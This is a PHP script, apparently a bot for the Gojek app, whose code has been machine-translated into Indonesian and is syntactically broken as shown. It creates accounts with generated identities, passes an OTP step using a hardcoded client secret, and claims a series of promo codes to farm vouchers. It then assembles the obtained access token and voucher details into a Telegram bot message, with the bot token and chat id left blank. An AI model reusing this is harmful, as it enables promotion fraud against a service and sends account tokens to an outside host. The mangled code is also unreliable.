<? php
date_default_timezone_set ( 'Asia / Jakarta' );
termasuk  "function.php" ;
ulang:
// perubahan fungsi () {
 warna gema ( "merah" , "GENGSOL KALAH JERO KAKEAN BOJO ORA BEJO - BEJO \ n" );
 warna gema ( "putih" , "Waktu:" . tanggal ( '[dmY] [H: i: s]' ). "\ n" );
 warna gema ( "putih" , "Tidak Punah \ n" );
 warna gema ( "putih" , "Format Kode 62 *** \ n" );
        $ nama = nama ();
        $ email = str_replace ( "" , "" , $ nama ). mt_rand ( 100 , 999 );
         warna gema ( "putih" , "NOMOR:" );
        // $ no = trim (fgets (STDIN));
        $ nohp = trim ( fgets ( STDIN ));
        $ nohp = str_replace ( "62" , "62" , $ nohp );
        $ nohp = str_replace ( "(" , "" , $ nohp );
        $ nohp = str_replace ( ")" , "" , $ nohp );
        $ nohp = str_replace ( "-" , "" , $ nohp );
        $ nohp = str_replace ( "" , "" , $ nohp );

        if (! preg_match ( '/ [^ + 0-9] /' , trim ( $ nohp ))) {
            if ( substr ( trim ( $ nohp ), 0 , 3 ) == '62' ) {
                $ hp = trim ( $ nohp );
            }
            lain  jika ( substr ( trim ( $ nohp ), 0 , 1 ) == '0' ) {
                $ hp = '62' . substr ( trim ( $ nohp ), 1 );
        }
         elseif ( substr ( trim ( $ nohp ), 0 , 2 ) == '62' ) {
            $ hp = '6' . substr ( trim ( $ nohp ), 1 );
        }
        selain itu {
            $ hp = '1' . substr ( trim ( $ nohp ), 0 , 13 );
        }
    }
        $ data = '{"email": "' . $ email . '@ gmail.com", "name": "' . $ nama . '", "phone": "+' . $ hp . '", " signed_up_country ":" ID "} ' ;
        $ register = request ( "/ v5 / customers" , null , $ data );
        if ( strpos ( $ register , '"otp_token"' )) {
        $ otptoken = getStr ( '"otp_token": "' , '"' , $ register );
         warna gema ( "putih" , "KODE OTP .." ). "\ n" ;
        otp:
         warna gema ( "putih" , "Otp:" );
        $ otp = trim ( fgets ( STDIN ));
        $ data1 = '{"client_name": "gojek: cons: android", "data": {"otp": "' . $ otp . '", "otp_token": "' . $ otptoken . '"}, " client_secret ":" 83415d06-ec4e-11e6-a41b-6c40088ab51e "} ' ;
        $ verif = permintaan ( "/ v5 / pelanggan / telepon / verifikasi" , null , $ data1 );
        if ( strpos ( $ verif , '"access_token"' )) {
         warna gema ( "putih" , "BERHASIL MENDA berlangganan \ n" );
        $ token = getStr ( '"access_token": "' , '"' , $ verif );
        $ uuid = getStr ( '"resource_owner_id":' , ',' , $ verif );
         warna gema ( "putih" , "+] Token akses Anda:" . $ token . "\ n \ n" );
        save ( "token.txt" , $ token );
         warna gema ( "putih" , "\ n▬▬▬▬▬▬▬▬▬▬▬▬CLAIM VOUCHER▬▬▬▬▬▬▬▬▬▬▬▬" );
        gema  "\ n" . warna ( "putih" , "KLAIM A .." );
        gema  "\ n" . warna ( "putih" , "Harap tunggu" );
        untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
         warna gema ( "putih" , "." );
        tidur ( 5 );
        }
        $ code1 = permintaan ( '/ go-promotion / v1 / promotion / pendaftaran' , $ token , '{"promo_code": "EATLAH"}' );
        $ message = fetch_value ( $ code1 , '"message": "' , '"' );
        if ( strpos ( $ code1 , 'Promo kamu sudah bisa dipakai' )) {
        gema  "\ n" . warna ( "hijau" , "Pesan:" . $ pesan );
        goto gocar;
        } lain {
        gema  "\ n" . warna ( "putih" , "Pesan:" . $ pesan );
	gocar:
        gema  "\ n" . warna ( "putih" , "KLAIM B .." );
        gema  "\ n" . warna ( "putih" , "Harap tunggu" );
        untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
         warna gema ( "putih" , "." );
        tidur ( 35 );
        }
        $ code1 = permintaan ( '/ promosi-pergi / v1 / promosi / pendaftaran' , $ token , '{"promo_code": "COBAGOFOOD2206"}' );
        $ message = fetch_value ( $ code1 , '"message": "' , '"' );
        if ( strpos ( $ code1 , 'Promo kamu sudah bisa dipakai.' )) {
        gema  "\ n" . warna ( "hijau" , "Pesan:" . $ pesan );
        goto gofood;
        } lain {
        gema  "\ n" . warna ( "putih" , "Pesan:" . $ pesan );
        gofood:
        gema  "\ n" . warna ( "putih" , "KLAIM C .." );
        gema  "\ n" . warna ( "putih" , "Harap tunggu" );
        untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
         warna gema ( "putih" , "." );
        tidur ( 3 );
        }
        $ code1 = permintaan ( '/ promosi-pergi / v1 / promosi / pendaftaran' , $ token , '{"promo_code": "PESANGOFOOD2206"}' );
        $ message = fetch_value ( $ code1 , '"message": "' , '"' );
        gema  "\ n" . warna ( "putih" , "Pesan:" . $ pesan );
        gema  "\ n" . warna ( "putih" , "VOCER COLI." );
        gema  "\ n" . warna ( "putih" , "Harap tunggu" );
        untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
         warna gema ( "putih" , "." );
        tidur ( 3 );
        }
               tidur ( 1 );
        $ cekvoucher = request ( '/ gopoints / v3 / wallet / voucher? limit = 13 & halaman = 1' , $ token );
        $ total = fetch_value ( $ cekvoucher , '"total_vouchers":' , ',' );
        $ voucher1 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "1" );
        $ voucher2 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "2" );
        $ voucher3 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "3" );
        $ voucher4 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "4" );
        $ voucher5 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "5" );
        $ voucher6 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "6" );
        $ voucher7 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "7" );
        $ voucher8 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "8" );
        $ voucher9 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "9" );
        $ voucher10 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "10" );
        $ voucher11 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "11" );
        $ voucher12 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "12" );
        $ voucher13 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "13" );
        gema  "\ n" . warna ( "putih" , "Total voucher" . $ total . ":" );
        gema  "\ n" . warna ( "putih" , "1." . $ voucher1 );
        gema  "\ n" . warna ( "putih" , "2." . $ voucher2 );
        gema  "\ n" . warna ( "putih" , "3." . $ voucher3 );
        gema  "\ n" . warna ( "putih" , "4." . $ voucher4 );
        gema  "\ n" . warna ( "putih" , "5." . $ voucher5 );
        gema  "\ n" . warna ( "putih" , "6." . $ voucher6 );
        gema  "\ n" . warna ( "putih" , "7." . $ voucher7 );
        gema  "\ n" . warna ( "putih" , "8." . $ voucher8 );
        gema  "\ n" . warna ( "putih" , "9." . $ voucher9 );
        gema  "\ n" . warna ( "putih" , "10." . $ voucher10 );
	gema  "\ n" . warna ( "putih" , "11." . $ voucher11 );
        gema  "\ n" . warna ( "putih" , "12." . $ voucher12 );
        gema  "\ n" . warna ( "putih" , "13." . $ voucher13 );
        gema "\ n" ;
        $ expired1 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '1' );
        $ expired2 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '2' );
        $ expired3 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '3' );
        $ expired4 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '4' );
        $ expired5 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '5' );
        $ expired6 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '6' );
        $ expired7 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '7' );
        $ expired8 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '8' );
        $ expired9 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '9' );
        $ expired10 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '10' );
        $ expired11 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '11' );
        $ expired12 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '12' );
        $ expired13 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '13' );
        $ TOKEN   = ":" ;
	$ chatid = "" ;
	$ pesan  	= "[+] Info Akun Gojek [+] \ n \ n" . $ token . "\ n \ nTotalVoucher =" . $ total . "\ n [+]" . $ voucher1 . "\ n [+] Exp: [" . $ kedaluwarsa1 . "] \ n [+]" . $ voucher2 . "\ n [+] Exp: [" . $ kedaluwarsa2 . "] \ n [+]" . $ voucher3 . "\ n [+] Exp: [" . $ kedaluwarsa3 . "] \ n [+]" ."\ n [+] Exp: [" . $ kedaluwarsa4 . "] \ n [+]" . $ voucher5 . "\ n [+] Exp: [" . $ kedaluwarsa5 . "] \ n [+]" . $ voucher6 . "\ n [+] Exp: [" . $ kedaluwarsa6 . "] \ n [+]" . $ voucher7 . "\ n [+] Exp: [" . $ kedaluwarsa7 . "] \ n [+]" . $ voucher8 . "\ n [+] Exp: [" . $ kedaluwarsa8 . "] \ n [+]" . $voucher9 . "\ n [+] Exp: [" . $ kedaluwarsa9 . "] \ n [+]" . $ voucher10 . "\ n [+] Exp: [" . $ kedaluwarsa10 . "]" . $ voucher11 . "\ n [+] Exp: [" . $ kedaluwarsa11 . "] \ n [+]" . $ voucher12 . "\ n [+] Exp: [" . $ kedaluwarsa12 . "] \ n [+]" . $ voucher13 . "\ n [+] Exp: [" . $ kedaluwarsa13 . "] \ n [+]";
	$ method 	= "sendMessage" ;
	$ url     = "https://api.telegram.org/bot" . $ TOKEN . "/" . $ method ;
	$ post = [
 		'chat_id' => $ chatid ,
                'text' => $ pesan
        	];
                $ header = [
                "X-Diminta-Dengan: XMLHttpRequest" ,
                "Agen-Pengguna: Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 51.0.2704.84 Safari / 537.36" 
                        ]; tidur ( 3 );
        $ boba09 = permintaan ( '/ promosi-promosi / v1 / promosi / pendaftaran' , $ token , '{"promo_code": "PAKEGOFOOD0906"}' );
        $ messageboba09 = fetch_value ( $ boba09 , '"message": "' , '"' );
        gema  "\ n" . warna ( "putih" , "Pesan:" . $ messageboba09 );
        tidur ( 1 );

